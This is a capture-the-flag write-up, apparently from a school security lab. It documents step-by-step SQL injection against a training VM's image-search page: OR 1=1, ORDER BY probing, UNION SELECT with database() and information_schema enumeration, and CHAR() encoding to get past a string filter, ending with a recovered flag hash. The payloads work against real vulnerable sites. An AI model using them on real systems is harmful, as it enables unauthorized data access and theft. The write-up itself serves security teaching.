The page 'search image' http://192.168.56.101/index.php?page=searchimg display a
search field to look for images.

The field accepts only digits and strings

We can see it's a GET request by looking at the url :

http://192.168.56.101/?page=member&id=5&Submit=Submit#
the GET dictionnarie receives the following set of ker values
	- page -> searchimg
	- id = 5
	- submit -> subbmit

We put the value 1 and get the following answer:

ID: 1
Title: Nsa
Url : https://www.nsa.org/img.jpg

We can determine the SQL request crafted by the server is in the following form:

SELECT ?id, ?title, ?url FROM ?table_name
WHERE ?id = 1

It is sensible to injection because we can procede to an arithmetic operation :
searching for 1+1 gives us the result for id=2

In order to get all the result possible we look for a way to get the last statement
true for each row.
SELECT ?id, ?title, ?url FROM ?table_name
 WHERE ?id = 1 OR 1=1

we type 1 OR 1=1 in the search field and we get all the result because every row
is considered true.

we find this one that indicates that the member with ID = 5 may have a flag:

ID: 5 OR 1=1
Title: Hack me ?
Url : borntosec.ddns.net/images.png

We need to dertermine the number of field the sql sends because we will craft an
injection with UNION. To do that we user ORDER BY. We will try a number until we find
an error. We craft the following SQL request

SQL :
[...]
WHERE id= 5
ORDER BY 3

url :
http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=5 ORDER BY 3

-> this one gives us an error, the request sends two fields.

We want to find the name of the database with the database() call :

SQL :
[...]
WHERE id=10 (= 10 because we know it doesn't exist so we get only one result)
UNION
SELECT 1, database()

url :
http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=10 UNION SELECT 1,database()

we get the following response :

ID: 10 UNION SELECT 1,database()
Title: Member_images
Url : 1

database name = Member_images

We look for the list of table using the 'information_schema.TABLES', we need to
select the TABLE_NAME column of 'information_schema.TABLES'

http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25
UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES
WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)

we use the function CHAR because we know the server doesn't accept strings.
the numbers correspond to the ASCII value of Member_images

It gives us the name of the only table : list_images

We want to know the name of all the columns in the table list_images :

http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25
UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)
AND TABLE_NAME = CHAR(108,105,115,116,095,105,109,097,103,101,115)



we get the following columns : id, url, title, comment
we craft the last injection where we try all the columns:

http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25 OR 1=1
UNION SELECT id, url
FROM list_images

http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25 OR 1=1
UNION SELECT id, title
FROM list_images

http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25 OR 1=1
UNION SELECT id, comment
FROM list_images


for id = 5 we get this comment :
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

the flag is sha256('albatroz')

how to secure :
 - sanitize input
